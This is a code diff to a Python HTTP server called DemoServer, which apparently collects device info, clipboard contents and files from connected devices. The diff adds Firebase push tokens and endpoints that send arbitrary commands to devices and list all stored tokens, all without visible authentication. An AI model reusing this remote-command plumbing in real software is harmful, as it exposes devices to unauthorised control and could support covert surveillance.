@@ -24,6 +24,23 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
 import urllib.parse
 
+# FCM sender
+try:
+    from fcm_sender import FcmSender
+    _fcm_service_account_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "firebase-service-account.json")
+    fcm_sender = None
+    if os.path.exists(_fcm_service_account_path):
+        try:
+            fcm_sender = FcmSender(_fcm_service_account_path)
+            print(f"[+] FCM sender initialized with service account: {_fcm_service_account_path}")
+        except Exception as e:
+            print(f"[!] FCM sender init failed: {e}")
+    else:
+        print(f"[!] FCM service account not found at {_fcm_service_account_path} — push notifications disabled")
+except ImportError:
+    print("[!] fcm_sender module not found — push notifications disabled")
+    fcm_sender = None
+
 # Create directories for received files
 RECEIVED_DIR = "received_files"
 IMAGES_DIR = os.path.join(RECEIVED_DIR, "images")
@@ -70,6 +87,7 @@ class DeviceSession:
         self.last_device_info = None
         self.last_battery_info = None
         self.last_clipboard = None
+        self.fcm_token = None  # FCM registration token for push notifications
 
 
 class DemoServer:
@@ -969,6 +987,25 @@ class DemoServer:
                 self.log(f"    ... and {count - 20} more")
             self.log_to_file(message, session.address)
 
+        elif msg_type == "fcm_token":
+            token = message.get("token", "")
+            device_id = message.get("device_id", session.device_id)
+            session.fcm_token = token
+            # Store token in device_tokens.json for persistence
+            tokens_file = "device_tokens.json"
+            try:
+                tokens = {}
+                if os.path.exists(tokens_file):
+                    with open(tokens_file, 'r') as f:
+                        tokens = json.load(f)
+                tokens[device_id] = token
+                with open(tokens_file, 'w') as f:
+                    json.dump(tokens, f, indent=2)
+            except Exception as e:
+                self.log(f"[!] Failed to save FCM token: {e}")
+            self.log(f"[i] FCM token received from device {device_id}: {token[:30]}...")
+            self.log_to_file(message, session.address)
+
         else:
             self.log(f"[i] Message from session {session.session_id}: {msg_type}")
             self.log_to_file(message, session.address)
@@ -1033,6 +1070,10 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             self.handle_get_battery(query)
         elif path == '/api/clipboard':
             self.handle_get_clipboard(query)
+        elif path == '/api/fcm-send':
+            self.handle_fcm_send(query)
+        elif path == '/api/fcm-tokens':
+            self.handle_get_fcm_tokens(query)
         else:
             self.send_error(404, "Not Found")
 
@@ -1385,6 +1426,74 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         with self.server_instance.lock:
             session = self.server_instance.sessions.get(sid)
             self.send_json_response({'clipboard': session.last_clipboard} if session else {'clipboard': {}})
+
+    def handle_fcm_send(self, query):
+        """Send an FCM push command to a device."""
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        global fcm_sender
+        if fcm_sender is None:
+            self.send_json_response({'status': 'error', 'message': 'FCM not configured — place service account JSON as firebase-service-account.json'})
+            return
+
+        command = query.get('command', [''])[0]
+        device_id = query.get('session', [''])[0]
+        args_str = query.get('args', ['{}'])[0]
+
+        if not command:
+            self.send_json_response({'status': 'error', 'message': 'Missing command'})
+            return
+
+        # Get FCM token for this device
+        fcm_token = None
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(device_id)
+            if session:
+                fcm_token = session.fcm_token
+
+        # Fall back to persisted tokens file
+        if not fcm_token:
+            tokens_file = "device_tokens.json"
+            if os.path.exists(tokens_file):
+                try:
+                    with open(tokens_file, 'r') as f:
+                        tokens = json.load(f)
+                    fcm_token = tokens.get(device_id)
+                except:
+                    pass
+
+        if not fcm_token:
+            self.send_json_response({'status': 'error', 'message': f'No FCM token for device {device_id}'})
+            return
+
+        # Parse extra args
+        extra_args = {}
+        try:
+            extra_args = json.loads(args_str)
+        except:
+            pass
+
+        result = fcm_sender.send_command(fcm_token, command, extra_args)
+        self.send_json_response(result)
+
+    def handle_get_fcm_tokens(self, query):
+        """Return stored FCM tokens for all devices."""
+        tokens_file = "device_tokens.json"
+        tokens = {}
+        if os.path.exists(tokens_file):
+            try:
+                with open(tokens_file, 'r') as f:
+                    tokens = json.load(f)
+            except:
+                pass
+        # Also include tokens from active sessions
+        if self.server_instance:
+            with self.server_instance.lock:
+                for device_id, session in self.server_instance.sessions.items():
+                    if session.fcm_token:
+                        tokens[device_id] = session.fcm_token
+        self.send_json_response({'tokens': tokens})
 
     def handle_delete_file(self, query):
         """Delete a file from received_files directory."""
